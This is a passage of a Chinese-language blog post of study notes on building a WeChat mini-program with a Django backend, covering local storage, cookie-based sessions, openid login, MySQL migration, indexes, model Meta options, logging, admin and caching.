<h6 id="Task（网络任务对象）"><a href="#Task（网络任务对象）" class="headerlink" title="*Task（网络任务对象）"></a>*Task（网络任务对象）</h6><p>中断任务<br>触发回调函数<br>关闭连接</p>
<h5 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h5><p>将数据存储在本地缓存中指定的key中，数据存储生命周期跟小程序本身一致。<br>◆wx.setStorage<br>◆wx.getStorage<br>◆wx.removeStorage<br>◆wx.clearStorage（前三个操作指定的缓存，最后一个删除所有缓存）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;button bindtap=&apos;testStorage&apos;&gt;Test Storage&lt;/button&gt;</span><br><span class="line">testStorage: function()&#123;</span><br><span class="line">    wx.setStorage(&#123;</span><br><span class="line">      key: &apos;test&apos;,</span><br><span class="line">      data: &apos;data&apos;,</span><br><span class="line">    &#125;)</span><br><span class="line">    wx.getStorage(&#123;//异步</span><br><span class="line">      key: &apos;test&apos;,</span><br><span class="line">      success: function(res) &#123;</span><br><span class="line">        var data = res.data</span><br><span class="line">        console.log(&apos;data from storage 1: &apos;, data)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    var data = wx.getStorageSync(&apos;test&apos;)//同步</span><br><span class="line"></span><br><span class="line">    console.log(&apos;data from storage 2: &apos;, data)</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><h5 id="提供一个全局的问价管理系统，来实现对文件的增删改查"><a href="#提供一个全局的问价管理系统，来实现对文件的增删改查" class="headerlink" title="提供一个全局的问价管理系统，来实现对文件的增删改查"></a>提供一个全局的问价管理系统，来实现对文件的增删改查</h5><p>var fs=wx. getFileSystemManager()</p>
<p>◆fs.saveFile<br>◆fs.removeSavedFile<br>◆fs.writeFile<br>◆fs.appendFile<br>◆fs.readFile</p>
<h5 id="文件夹操作"><a href="#文件夹操作" class="headerlink" title="文件夹操作"></a>文件夹操作</h5><p>◆fs.mkdir<br>◆fs.rmdir<br>◆fs.isDirectory<br>◆fs.isFile</p>
<h4 id="开放能力"><a href="#开放能力" class="headerlink" title="开放能力"></a>开放能力</h4><p>◆用户数据<br>◆推送消息<br>◆运营数据</p>
<h5 id="用户数据"><a href="#用户数据" class="headerlink" title="用户数据"></a>用户数据</h5><p>◆头像、昵称等公开信息—wx.getUserlnfo）<br>◆openid等敏感数据</p>
<h5 id="基础组件"><a href="#基础组件" class="headerlink" title="基础组件"></a>基础组件</h5><p>开源</p>
<h2 id="Django视图层"><a href="#Django视图层" class="headerlink" title="Django视图层"></a>Django视图层</h2><p>Django Response对象<br>◆状态码——Response对象的status属性<br>◆应答内容——Response对象的content属性<br>◆延伸的Response子类——（JsonResponse、FileResponse）</p>
<h2 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h2><h3 id="有状态服务"><a href="#有状态服务" class="headerlink" title="有状态服务"></a>有状态服务</h3><h4 id="什么是状态"><a href="#什么是状态" class="headerlink" title="什么是状态"></a>什么是状态</h4><p>无状态服务:就是没有特殊状态的服务,各个请求对于服务器来说统一无差别处理,请求自身携带了所有服务端所需要的所有参数(服务端自身不存储跟请求相关的任何数据,不包括数据库存储信息)</p>
<p>有状态服务:与之相反,有状态服务在服务端保留之前请求的信息,用以处理当前请求,比如session等</p>
<p>小程序状态：小程序与后台通信需要通过微信后台来进行转发。</p>
<h2 id="小程序的状态管理"><a href="#小程序的状态管理" class="headerlink" title="小程序的状态管理"></a>小程序的状态管理</h2><p>在 utils 包中添加 Cookie.js 工具包，然后在里面有三个函数，取出、存储、取出。</p>
<p>const key = ‘cookie’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getSessionIDFromResponse(res)&#123;</span><br><span class="line">  var cookie = res.header[&apos;Set-Cookie&apos;]</span><br><span class="line">  console.log(&apos;get cookie from response: &apos; + cookie)</span><br><span class="line">  return cookie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setCookieToStorage(cookie) &#123;</span><br><span class="line">  try&#123;</span><br><span class="line">    wx.setStorageSync(key, cookie)</span><br><span class="line">  &#125;catch(e)&#123;</span><br><span class="line">    console.log(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getCookieFromStorage() &#123;</span><br><span class="line">  var value = wx.getStorageSync(key)</span><br><span class="line">  return value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Django 的 Session 中间件</p>
<p>启用 Session 中间件：setting中的 MIDDLEWARE。</p>
<p>使用 Session 的方法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def test_session(request):</span><br><span class="line">    request.session[&apos;message&apos;] = &apos;Test Django Session OK!&apos;</span><br><span class="line">    response = wrap_json_response(code=ReturnCode.SUCCESS)</span><br><span class="line">    return JsonResponse(data=response, safe=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test_session2(request):</span><br><span class="line">    print(&apos;session content: &apos;, request.session.items())</span><br><span class="line">    response = wrap_json_response(code=ReturnCode.SUCCESS)</span><br><span class="line">    return JsonResponse(data=response, safe=False)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onReadCookies: function ()&#123;</span><br><span class="line">  wx.request(&#123;</span><br><span class="line">    url: app.globalData.serverUrl + app.globalData.apiVersion + &apos;/auth/test&apos;,</span><br><span class="line">    success: function(res)&#123;</span><br><span class="line">      var cookie = cookieUtil.getSessionIDFromResponse(res)</span><br><span class="line">      console.log(cookie)</span><br><span class="line">      cookieUtil.setCookieToStorage(cookie)</span><br><span class="line"></span><br><span class="line">      var newCookie = cookieUtil.getCookieFromStorage()</span><br><span class="line"></span><br><span class="line">      var header = &#123;&#125;</span><br><span class="line">      header.Cookie = newCookie</span><br><span class="line"></span><br><span class="line">      wx.request(&#123;</span><br><span class="line">        url: app.globalData.serverUrl + app.globalData.apiVersion + &apos;/auth/test2&apos;,</span><br><span class="line">        header: header,</span><br><span class="line">        success: function(res)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p><img data-src="http://tuchuang.xchcloud.cn/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86.jpg" alt="小程序中的状态管理"></p>
<h3 id="小程序登录功能"><a href="#小程序登录功能" class="headerlink" title="小程序登录功能"></a>小程序登录功能</h3><p><img data-src="http://tuchuang.xchcloud.cn/%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7openid.png" alt></p>
<p><strong>使用哪种用户体系呢</strong></p>
<p>自建用户体系：<br>邮箱、电话等标记用户；填写、去重等复杂的交互逻辑。</p>
<p>沿用微信用户体系：<br>openid——微信用户的唯一识别标志。</p>
<p><strong>用户模型与用户视图：</strong><br>用户的唯一标识；<br>用户的基本信息。<br>获取用户的 OpenID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User(models.Model):</span><br><span class="line">    # openid</span><br><span class="line">    open_id = models.CharField(max_length=32, unique=True)</span><br><span class="line">    # 昵称</span><br><span class="line">    nickname = models.CharField(max_length=256)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class UserView(View,CommonResponseMixin):</span><br><span class="line">    def get(self, request):</span><br><span class="line">        pass</span><br><span class="line">    def post(self, request):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 路径：</span><br><span class="line">path(&apos;user&apos;, views.UserView.as_view())</span><br><span class="line"></span><br><span class="line"># 为什么是 as.view()</span><br></pre></td></tr></table></figure>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>调用微信的 wx.login 获取临时的 code，不需要任何的参数，直接定义成功的回调函数，然后就是赋值，定义请求函数，包含请求链接、请求方式、请求内容，以及确定 GET POST 请求方式是否需要请求头，可以定义一个回调函数番薯输出登录成功。<br>定义cookies：获取、存储、获取</p>
<p><strong>问题：</strong><br>code 是啥？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authorize: function () &#123;</span><br><span class="line">  wx.login(&#123;</span><br><span class="line">    success: function(res)&#123;</span><br><span class="line">      var code = res.code</span><br><span class="line">      var appId = app.globalData.appId</span><br><span class="line">      var nickname = app.globalData.userInfo.nickName</span><br><span class="line">      wx.request(&#123;</span><br><span class="line">        url: app.globalData.serverUrl + app.globalData.apiVersion + &apos;/auth/authorize&apos;,</span><br><span class="line">        method: &apos;POST&apos;,</span><br><span class="line">        data: &#123;                     //数据内容</span><br><span class="line">          code: code,</span><br><span class="line">          appId: appId,</span><br><span class="line">          nickname: nickname</span><br><span class="line">        &#125;,</span><br><span class="line">        header: &#123;                  //请求头</span><br><span class="line">          &apos;content-type&apos;: &apos;application/json&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        success: function(res)&#123;  //回调函数</span><br><span class="line">          wx.showToast(&#123;</span><br><span class="line">            title: &apos;授权成功&apos;</span><br><span class="line">          &#125;)</span><br><span class="line">          var cookie = cookieUtil.getSessionIDFromResponse(res)</span><br><span class="line">          cookieUtil.setCookieToStorage(cookie)</span><br><span class="line">          console.log(cookie)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p><strong>出现的错误：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ModuleNotFoundError: No module named &apos;Crypto&apos;</span><br><span class="line">解决方法：</span><br><span class="line"></span><br><span class="line">pip install pycryptodome</span><br><span class="line">当然有可能会出现这种情况：看到报错后是这么安装的：pip install crypto</span><br><span class="line"></span><br><span class="line">但是运行还是报错：ModuleNotFoundError: No module named &apos;Crypto&apos;；</span><br><span class="line">此时需要去环境中将安装的包crypto的名字改成Crypto,首字母大写；</span><br><span class="line">然后再次运行，出现这个错误：ModuleNotFoundError: No module named &apos;Crypto.Cipher&apos;</span><br><span class="line">此时进入到安装的文件夹下，发现没有此文件：</span><br><span class="line">需要卸载刚才安装的包：pip uninstall crypto</span><br><span class="line">然后重新安装：pip install pycryptodome，即可！</span><br><span class="line"></span><br><span class="line">&quot;errcode&quot;:40029：</span><br><span class="line">解决方法:</span><br><span class="line"></span><br><span class="line">微信开发者工具里开发项目需要填写appID，后台请求openid也需要appID，</span><br><span class="line">确认appID是否一致，确认appsecret是否一致，临时登录凭证code ，appID和appsecret必须相互对应。</span><br><span class="line"></span><br><span class="line">errcode&quot;:40125：</span><br><span class="line">解决方法：</span><br><span class="line"></span><br><span class="line">1.代码中设置的微信APPsecret和微信开放平台不一致，需要您自己对照微信开放平台和代码中的appsecret， 检查修正。 </span><br><span class="line">2.由于秘钥无效导致的，秘钥如果长时间不登录，会自动重置。</span><br></pre></td></tr></table></figure>
<h3 id="完善用户的个人信息"><a href="#完善用户的个人信息" class="headerlink" title="完善用户的个人信息"></a>完善用户的个人信息</h3><h4 id="用户模型的变更"><a href="#用户模型的变更" class="headerlink" title="用户模型的变更"></a>用户模型的变更</h4><h4 id="修改个人信息的功能开发"><a href="#修改个人信息的功能开发" class="headerlink" title="修改个人信息的功能开发"></a>修改个人信息的功能开发</h4><h3 id="复杂多变的用户状态管理"><a href="#复杂多变的用户状态管理" class="headerlink" title="复杂多变的用户状态管理"></a>复杂多变的用户状态管理</h3><h4 id="有状态的应用服务"><a href="#有状态的应用服务" class="headerlink" title="有状态的应用服务"></a>有状态的应用服务</h4><h4 id="Index-首页的实现"><a href="#Index-首页的实现" class="headerlink" title="Index 首页的实现"></a>Index 首页的实现</h4><h2 id="深入-Django-模型层"><a href="#深入-Django-模型层" class="headerlink" title="深入 Django 模型层"></a>深入 Django 模型层</h2><h3 id="跨DB迁移——模型层使用至数据库迁移"><a href="#跨DB迁移——模型层使用至数据库迁移" class="headerlink" title="跨DB迁移——模型层使用至数据库迁移"></a>跨DB迁移——模型层使用至数据库迁移</h3><h4 id="迁移的必要性"><a href="#迁移的必要性" class="headerlink" title="迁移的必要性"></a>迁移的必要性</h4><p>sqlite3在项目开发初期便利</p>
<p>sqlite3是文件数据库，性能跟不上</p>
<p>mysql是工业界非常常用的数据库</p>
<h4 id="迁移的过程"><a href="#迁移的过程" class="headerlink" title="迁移的过程"></a>迁移的过程</h4><h5 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h5><p>python manage.py dumpdate authorization &gt; authorization_data.json</p>
<h5 id="表结构同步配置"><a href="#表结构同步配置" class="headerlink" title="表结构同步配置"></a>表结构同步配置</h5><p>创建Mysql数据库并更新配置</p>
<p>创建slave数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &apos;default&apos;: &#123;</span><br><span class="line">        &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;,</span><br><span class="line">        &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;),</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;slave&apos;: &#123;</span><br><span class="line">        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,</span><br><span class="line">        &apos;NAME&apos;: &apos;backend&apos;,</span><br><span class="line">        &apos;USER&apos;: &apos;root&apos;,</span><br><span class="line">        &apos;PASSWORD&apos;: &apos;&apos;,</span><br><span class="line">        &apos;HOST&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">        &apos;PORT&apos;: &apos;3306&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 可以同时支持多个数据库，但是仅仅只有default默认数据库挂掉以后启动第二个</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    &apos;default&apos;: &#123;</span><br><span class="line">        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,</span><br><span class="line">        &apos;NAME&apos;: &apos;backend&apos;,</span><br><span class="line">        &apos;USER&apos;: &apos;root&apos;,</span><br><span class="line">        &apos;PASSWORD&apos;: &apos;&apos;,</span><br><span class="line">        &apos;HOST&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">        &apos;PORT&apos;: &apos;3306&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>表结构的同步</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python manager.py migrate --run-syncdb --database slave</span><br></pre></td></tr></table></figure>
<h5 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h5><p>python manager.py loaddata authorization_data.json</p>
<h3 id="数据库索引——模型层使用之索引"><a href="#数据库索引——模型层使用之索引" class="headerlink" title="数据库索引——模型层使用之索引"></a>数据库索引——模型层使用之索引</h3><h4 id="索引的概述"><a href="#索引的概述" class="headerlink" title="索引的概述"></a>索引的概述</h4><p>索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。如果想按特定职员的姓来查找他或她，则与在表中搜索所有的行相比，索引有助于更快地获取信息。<br>索引的一个主要目的就是加快检索表中数据，亦即能协助信息搜索者尽快的找到符合限制条件的记录ID的辅助数据结构。</p>
<p>优点：<br>加快检索数据的速度<br>降低插入、删除、更新的速度</p>
<h4 id="应该被索引的字段"><a href="#应该被索引的字段" class="headerlink" title="应该被索引的字段"></a>应该被索引的字段</h4><p>需要排序操作的字段(order_by)</p>
<p>需要比较操作的字段(&gt; &lt;&gt;)</p>
<p>需要过滤操作的字段(fluter)</p>
<h4 id="添加索引的两种方法"><a href="#添加索引的两种方法" class="headerlink" title="添加索引的两种方法"></a>添加索引的两种方法</h4><h5 id="属性中定义"><a href="#属性中定义" class="headerlink" title="属性中定义"></a>属性中定义</h5><p>nickname = models.CharField(max_length=256,db_index=True)</p>
<h5 id="模型的Meta添加索引"><a href="#模型的Meta添加索引" class="headerlink" title="模型的Meta添加索引"></a>模型的Meta添加索引</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Meta: </span><br><span class="line">    indexes = [</span><br><span class="line">        models.Index(fields=[&apos;nickname&apos;]),</span><br><span class="line">        models.Index(fields=[&apos;open_id&apos;, &apos;nickname&apos;])</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">组合索引是什么？组合索引建立的原则。b树和b+树的区别。</span><br><span class="line"></span><br><span class="line">一次查询只能用到一个索引，所以 首先枪毙 a，b各建索引方案</span><br><span class="line"></span><br><span class="line">a还是b？ 谁的区分度更高（同值的最少），建谁！</span><br><span class="line"></span><br><span class="line">当然，联合索引也是个不错的方案，ab，还是ba，则同上，区分度高者，在前</span><br><span class="line"></span><br><span class="line">索引用于快速找出在某个列中有一特定值的行。不使用索引，MySQL必须从第1条记录开始然后读完整个表直到找出相关的行，还需要考虑每次读入数据页的IO开销。而如果采取索引，则可以根据索引指向的页以及记录在页中的位置，迅速地读取目标页进而获取目标记录。</span><br><span class="line"></span><br><span class="line">大多数情况下都（默认）采用B树来构建索引。只是空间列类型的索引使用R-树，并且MEMORY表还支持hash索引。B树是平衡多叉树，每个节点存放多少个值取决于值所占的空间，这与每一张数据页存放多少条记录与记录信息量有关同理。节点中的值是以非降序进行排列的，节点中的值总是小于等于指向它的结点中的值。</span><br><span class="line"></span><br><span class="line">MySQL使用B树构造索引的情况下，是由叶子指向具体的页和记录的。并且一个叶子有一个指针指向下一个叶子。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Django模型类的Meta是一个内部类，它用于定义一些Django模型类的行为特性。而可用的选项大致包含以下几类</span><br><span class="line"></span><br><span class="line">abstract</span><br><span class="line">这个属性是定义当前的模型是不是一个抽象类。所谓抽象类是不会对应数据库表的。一般我们用它来归纳一些公共属性字段，然后继承它的子类可以继承这些字段。</span><br><span class="line"></span><br><span class="line">Options.abstract</span><br><span class="line">如果abstract = True 这个model就是一个抽象类</span><br><span class="line"></span><br><span class="line">app_label</span><br><span class="line">这个选型只在一种情况下使用，就是你的模型不在默认的应用程序包下的models.py文件中，这时候需要指定你这个模型是哪个应用程序的。</span><br><span class="line"></span><br><span class="line">Options.app_label</span><br><span class="line">如果一个model定义在默认的models.py，例如如果你的app的models在myapp.models子模块下，你必须定义app_label让Django知道它属于哪一个app</span><br><span class="line">app_label = &apos;myapp&apos;</span><br><span class="line"></span><br><span class="line">db_table</span><br><span class="line">db_table是指定自定义数据库表明的。Django有一套默认的按照一定规则生成数据模型对应的数据库表明。</span><br><span class="line">Options.db_table</span><br><span class="line">定义该model在数据库中的表名称</span><br><span class="line">　　db_table = &apos;Students&apos;</span><br><span class="line">如果你想使用自定义的表名，可以通过以下该属性</span><br><span class="line">　　table_name = &apos;my_owner_table&apos;</span><br><span class="line"></span><br><span class="line">db_teblespace</span><br><span class="line">Options.db_teblespace</span><br><span class="line">定义这个model所使用的数据库表空间。如果在项目的settin中定义那么它会使用这个值</span><br><span class="line"></span><br><span class="line">get_latest_by</span><br><span class="line">Options.get_latest_by</span><br><span class="line">在model中指定一个DateField或者DateTimeField。这个设置让你在使用model的Manager上的lastest方法时，默认使用指定字段来排序</span><br><span class="line"></span><br><span class="line">managed</span><br><span class="line">Options.managed</span><br><span class="line">默认值为True，这意味着Django可以使用syncdb和reset命令来创建或移除对应的数据库。默认值为True,如果你不希望这么做，可以把manage的值设置为False</span><br><span class="line"></span><br><span class="line">order_with_respect_to</span><br><span class="line">这个选项一般用于多对多的关系中，它指向一个关联对象，就是说关联对象找到这个对象后它是经过排序的。指定这个属性后你会得到一个get_xxx_order()和set_xxx_order()的方法，通过它们你可以设置或者回去排序的对象</span><br><span class="line"></span><br><span class="line">ordering</span><br><span class="line">这个字段是告诉Django模型对象返回的记录结果集是按照哪个字段排序的。这是一个字符串的元组或列表，没有一个字符串都是一个字段和用一个可选的表明降序的&apos;-&apos;构成。当字段名前面没有&apos;-&apos;时，将默认使用升序排列。使用&apos;?&apos;将会随机排列</span><br><span class="line"></span><br><span class="line">ordering=[&apos;order_date&apos;] # 按订单升序排列</span><br><span class="line">ordering=[&apos;-order_date&apos;] # 按订单降序排列，-表示降序</span><br><span class="line">ordering=[&apos;?order_date&apos;] # 随机排序，？表示随机</span><br><span class="line">ordering=[&apos;-pub_date&apos;,&apos;author&apos;] # 以pub_date为降序，在以author升序排列</span><br><span class="line">permissions</span><br><span class="line">permissions主要是为了在Django Admin管理模块下使用的，如果你设置了这个属性可以让指定的方法权限描述更清晰可读。Django自动为每个设置了admin的对象创建添加，删除和修改的权限。</span><br><span class="line">permissions = ((&apos;can_deliver_pizzas&apos;,&apos;Can deliver pizzas&apos;))</span><br><span class="line"></span><br><span class="line">proxy</span><br><span class="line">这是为了实现代理模型使用的，如果proxy = True,表示model是其父的代理 model </span><br><span class="line"></span><br><span class="line">unique_together</span><br><span class="line">unique_together这个选项用于：当你需要通过两个字段保持唯一性时使用。比如假设你希望，一个Person的FirstName和LastName两者的组合必须是唯一的，那么需要这样设置：</span><br><span class="line">unique_together = ((&quot;first_name&quot;, &quot;last_name&quot;),)</span><br><span class="line">一个ManyToManyField不能包含在unique_together中。如果你需要验证关联到ManyToManyField字段的唯一验证，尝试使用signal(信号)或者明确指定through属性。</span><br><span class="line"></span><br><span class="line">verbose_name</span><br><span class="line">verbose_name的意思很简单，就是给你的模型类起一个更可读的名字一般定义为中文，我们：</span><br><span class="line">verbose_name = &quot;学校&quot;</span><br><span class="line"></span><br><span class="line">verbose_name_plural</span><br><span class="line">这个选项是指定，模型的复数形式是什么，比如：</span><br><span class="line">verbose_name_plural = &quot;学校&quot;</span><br><span class="line">如果不指定Django会自动在模型名称后加一个’s’</span><br></pre></td></tr></table></figure>
<h4 id="关系映射实战"><a href="#关系映射实战" class="headerlink" title="关系映射实战"></a>关系映射实战</h4><h5 id="有没有用到关系映射实战"><a href="#有没有用到关系映射实战" class="headerlink" title="有没有用到关系映射实战"></a>有没有用到关系映射实战</h5><h5 id="用到哪种关系映射"><a href="#用到哪种关系映射" class="headerlink" title="用到哪种关系映射"></a>用到哪种关系映射</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line">class Wife(models.Model):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Husband(models.Model):</span><br><span class="line">    wife = models.OneToOneField(Wife,on_delete=models.CASCADE)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Mother(models.Model):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Father(models.Model):</span><br><span class="line">    Wife = models.OneToOneField(Mother, on_delete=models.DO_NOTHING)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class YoungerBrother(models.Model):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class ElderBrother(models.Model):</span><br><span class="line">    father_id = models.ForeignKey(Father,on_delete=models.DO_NOTHING)</span><br><span class="line">    younger_brother = models.ManyToManyField(YoungerBrother)</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
<h3 id="增删改查——模型层使用之数据库操作"><a href="#增删改查——模型层使用之数据库操作" class="headerlink" title="增删改查——模型层使用之数据库操作"></a>增删改查——模型层使用之数据库操作</h3><h3 id="模型层关系映射——模型层使用之关系映射"><a href="#模型层关系映射——模型层使用之关系映射" class="headerlink" title="模型层关系映射——模型层使用之关系映射"></a>模型层关系映射——模型层使用之关系映射</h3><h4 id="三种关系映射"><a href="#三种关系映射" class="headerlink" title="三种关系映射"></a>三种关系映射</h4><p>一对一的关系：OneToOneField</p>
<p>一对多的关系：ForeignKey</p>
<p>多对多的关系：ManyToManyfield</p>
<h3 id="Django-MTV-中的M-Model"><a href="#Django-MTV-中的M-Model" class="headerlink" title="Django MTV 中的M: Model"></a>Django MTV 中的M: Model</h3><h3 id="Django-ORM-框架"><a href="#Django-ORM-框架" class="headerlink" title="Django ORM 框架"></a>Django ORM 框架</h3><p><img data-src="http://tuchuang.xchcloud.cn/ORM%20%E6%A8%A1%E5%9E%8B.jpg" alt="ORM"><br>优点：屏蔽数据库差异；提供迁移工具；简化开发流程.</p>
<h2 id="Django-后台"><a href="#Django-后台" class="headerlink" title="Django 后台"></a>Django 后台</h2><h3 id="Django-日志模块"><a href="#Django-日志模块" class="headerlink" title="Django 日志模块"></a>Django 日志模块</h3><p>产生日志-&gt;渲染日志-&gt;匹配过滤-&gt;持久化</p>
<p>Request 信息<br>Setting 配置<br>Trabook 信息</p>
<p>日志模块配置</p>
<h4 id="格式器-formattar"><a href="#格式器-formattar" class="headerlink" title="格式器 formattar"></a>格式器 formattar</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E6%A0%BC%E5%BC%8F%E5%99%A8.png" alt="格式器"></p>
<p>eg<br><img data-src="http://tuchuang.xchcloud.cn/%E6%A0%BC%E5%BC%8F%E5%99%A8eg.png" alt="eg"></p>
<p>配置日志格式（位置、时间）</p>
<p>沿用python 语言里卖弄的格式属性</p>
<h4 id="过滤器-filter"><a href="#过滤器-filter" class="headerlink" title="过滤器 filter"></a>过滤器 filter</h4><p>日志有用打印，无用抛弃。</p>
<h4 id="处理器-handler"><a href="#处理器-handler" class="headerlink" title="处理器 handler"></a>处理器 handler</h4><p>对日志进行处理，比如：写进文件、打印屏幕等<br>常用处理器（文件处理器、终端处理器）</p>
<h4 id="日志实例-logger"><a href="#日志实例-logger" class="headerlink" title="日志实例 logger"></a>日志实例 logger</h4><p>在python代码里面打印日志的入口点<br>日志级别（DEBUG、INFO、WARNING、ERROR、CRITICAL）</p>
<h3 id="Django-admin-模块"><a href="#Django-admin-模块" class="headerlink" title="Django admin 模块"></a>Django admin 模块</h3><h4 id="为什么Django提供admin模块"><a href="#为什么Django提供admin模块" class="headerlink" title="为什么Django提供admin模块"></a>为什么Django提供admin模块</h4><p>管理界面是基础设施非常重要的一部分<br>添加、编辑和删除网站内容<br>功能类似但开发繁琐</p>
<p>认证用户-&gt;权限验证-&gt;页面展示-&gt;数据管理</p>
<h4 id="admin模块是什么"><a href="#admin模块是什么" class="headerlink" title="admin模块是什么"></a>admin模块是什么</h4><p>Django的自动管理界面<br>管理Django用户权限、模型数据、信息发布<br>拓展性强，基于此定制很多功能</p>
<h4 id="admin模块怎么使用"><a href="#admin模块怎么使用" class="headerlink" title="admin模块怎么使用"></a>admin模块怎么使用</h4><p>创建超级管理员用户<br>python manage.py createsuperuser</p>
<p>确认添加admin模块和路由说明<br>创建超级管理员<br>注册模型到admin模块</p>
<p>内容列表字段：重写str函数<br>不显示不可编辑字段：fields列表或exclude列表<br>重写save model函数实现保存逻辑</p>
<h3 id="Django-缓存模块"><a href="#Django-缓存模块" class="headerlink" title="Django 缓存模块"></a>Django 缓存模块</h3><h4 id="缓存概述"><a href="#缓存概述" class="headerlink" title="缓存概述"></a>缓存概述</h4><p>缓存是（高速）缓存的简称，英语：Cache<br>根本目的是为了加快数据访问速度，提高性能<br>协调两者数据传输速度的差异</p>
<p>缓存的置换策略<br>LFU、FIFO、LRU等算法<br>settings.py<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CACHES = &#123;</span><br><span class="line">    &apos;default&apos;: &#123;</span><br><span class="line">        # 1. MemCache</span><br><span class="line">        # &apos;BACKEND&apos;: &apos;django.core.cache.backends.memcached.MemcachedCache&apos;,</span><br><span class="line">        # &apos;LOCATION&apos;: &apos;127.0.0.1:11211&apos;,</span><br><span class="line"></span><br><span class="line">        # 2. DB Cache</span><br><span class="line">        # &apos;BACKEND&apos;: &apos;django.core.cache.backends.db.DatabaseCache&apos;,</span><br><span class="line">        # &apos;LOCATION&apos;: &apos;my_cache_table&apos;,</span><br><span class="line"></span><br><span class="line">        # 3. Filesystem Cache</span><br><span class="line">        # &apos;BACKEND&apos;: &apos;django.core.cache.backends.filebased.FileBasedCache&apos;,</span><br><span class="line">        # &apos;LOCATION&apos;: &apos;/var/tmp/django_cache&apos;,</span><br><span class="line"></span><br><span class="line">        # 4. Local Mem Cache</span><br><span class="line">        &apos;BACKEND&apos;: &apos;django.core.cache.backends.locmem.LocMemCache&apos;,</span><br><span class="line">        &apos;LOCATION&apos;: &apos;backend-cache&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>伪代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if data is in the cache:</span><br><span class="line">  return data</span><br><span class="line">else:</span><br><span class="line">  generate the data</span><br><span class="line">  save the data in the cache(set timeout)</span><br><span class="line">  return the generated data</span><br></pre></td></tr></table></figure></p>
<h4 id="Django缓存模块"><a href="#Django缓存模块" class="headerlink" title="Django缓存模块"></a>Django缓存模块</h4><h3 id="Django-后台服务部署"><a href="#Django-后台服务部署" class="headerlink" title="Django 后台服务部署"></a>Django 后台服务部署</h3><p>略</p>
